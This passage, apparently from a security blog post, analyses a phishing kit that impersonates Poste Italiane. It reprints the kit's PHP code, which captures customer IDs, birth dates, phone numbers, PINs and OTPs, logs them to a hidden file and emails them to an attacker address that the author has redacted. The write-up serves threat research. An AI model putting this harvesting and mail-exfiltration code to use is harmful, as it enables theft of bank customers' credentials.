+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="k"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtcc&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$codclient&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtcc&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;codclient&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$codclient&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="k"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtgg&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$giorno&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtgg&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="k"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtmm&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$mese&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtmm&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="k"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtaa&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$anno&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtaa&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This section is taking the parameters sent from &lt;code&gt;login.php&lt;/code&gt; and assigning them to variables with Italian names, so far we have assigned data for the customer ID, the day, the month and the year of the specified birth date.&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="k"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$telefono&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;require&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;includes/my_email.php&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;date_default_timezone_set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Europe/London&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_SERVER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;m-d-Y g:i:a&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$agent&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_SERVER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;HTTP_USER_AGENT&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;+ ------------------------------------------+&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$msg&lt;/span&gt; &lt;span class="o"&gt;.=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;+ Dati Login per &lt;/span&gt;&lt;span class="si"&gt;$username\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$msg&lt;/span&gt; &lt;span class="o"&gt;.=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;+ ------------------------------------------+&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$msg&lt;/span&gt; &lt;span class="o"&gt;.=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;| codcliente: &amp;#34;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$codclient&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$msg&lt;/span&gt; &lt;span class="o"&gt;.=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;| giorno: &amp;#34;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$giorno&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$msg&lt;/span&gt; &lt;span class="o"&gt;.=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;| mese: &amp;#34;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$mese&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$msg&lt;/span&gt; &lt;span class="o"&gt;.=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;| anno: &amp;#34;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$anno&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$msg&lt;/span&gt; &lt;span class="o"&gt;.=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;| telefono: &amp;#34;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$telefono&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$footer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;+ ------------------------------------------+&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$footer&lt;/span&gt; &lt;span class="o"&gt;.=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;+ Sent from &lt;/span&gt;&lt;span class="si"&gt;$v_ip&lt;/span&gt;&lt;span class="s2"&gt; on &lt;/span&gt;&lt;span class="si"&gt;$time&lt;/span&gt;&lt;span class="s2"&gt; via &lt;/span&gt;&lt;span class="si"&gt;$agent\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$footer&lt;/span&gt; &lt;span class="o"&gt;.=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;+ ------------------------------------------+&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$msg&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$footer&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;login_info&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$msg&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$fp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;fopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;*********&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// HIDING LOG FILE
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;fputs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$fp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;fclose&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$fp&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$subject&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Poste Login Info for User: &lt;/span&gt;&lt;span class="si"&gt;$username&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;From: Poste Login Info &amp;lt;&lt;/span&gt;&lt;span class="si"&gt;$my_email&lt;/span&gt;&lt;span class="s2"&gt;&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$headers&lt;/span&gt; &lt;span class="o"&gt;.=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Reply-To: Poste Login Info &amp;lt;&lt;/span&gt;&lt;span class="si"&gt;$my_email&lt;/span&gt;&lt;span class="s2"&gt;&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$headers&lt;/span&gt; &lt;span class="o"&gt;.=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;MIME-Version: 1.0&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$headers&lt;/span&gt; &lt;span class="o"&gt;.=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Content-Type: text/plain; charset=utf-8&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;mail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$my_email&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$subject&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$headers&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;After assigning the last bit of information coming from &lt;code&gt;login.php&lt;/code&gt; (the phone number) the code is now preparing the email to exfiltrate the data. The kit is taking the exfiltration email from &lt;code&gt;includes/my_email.php&lt;/code&gt; and then logging the stolen credentials in a txt file (I am not disclosing the path to prevent malicious actors to re-use the stolen credentials).&lt;/p&gt;
+&lt;p&gt;Below you can find &lt;code&gt;my_email.php&lt;/code&gt; (I have replaced the Gmail address with the asterisks):&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt; &lt;span class="nv"&gt;$my_email&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;***********@gmail.com&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;//////// YOUR EMAIL GOES HERE
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The comment &lt;em&gt;&amp;ldquo;YOUR EMAIL GOES HERE&amp;rdquo;&lt;/em&gt; may suggest that there are two different actors involved in this activity: one is developing the kit, while another malicious actor is using it. This may explain why there are instructions left in comments around the code base.&lt;/p&gt;
+&lt;p&gt;Here is the content of the txt log file, which contains a sample of the data that the criminal will receive via email:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ ------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ Dati Login per
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ ------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;| codcliente: 1111111
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;| giorno: 11
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;| mese: 01
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;| anno: 1111
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;| telefono: 111111111111
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ ------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2)
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ ------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ ------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ Dati Login per
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ ------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;| pin: 1111111
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ ------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2)
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ ------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ ------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ Dati Login per
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ ------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;| otp: 1111111
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ ------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2)
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ ------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ ------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ Dati Login per
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ ------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;| domanda1: 1111111
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;| domanda2: 1111111
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;| domanda3: 1111111
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ ------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2)
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ ------------------------------------------+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We can also see a User-Agent string exposed in the log above, which may suggest what platform and browser the criminal is using to develop the kit (Chrome 88 on Windows 8).&lt;/p&gt;
+&lt;h3 class="relative group"&gt;The big picture
+&lt;div id="the-big-picture" class="anchor"&gt;&lt;/div&gt;
+&lt;/h3&gt;
+&lt;p&gt;Based on the logs pasted previously, it&amp;rsquo;s easy to have an idea of how the kit works:&lt;/p&gt;
+&lt;ol&gt;
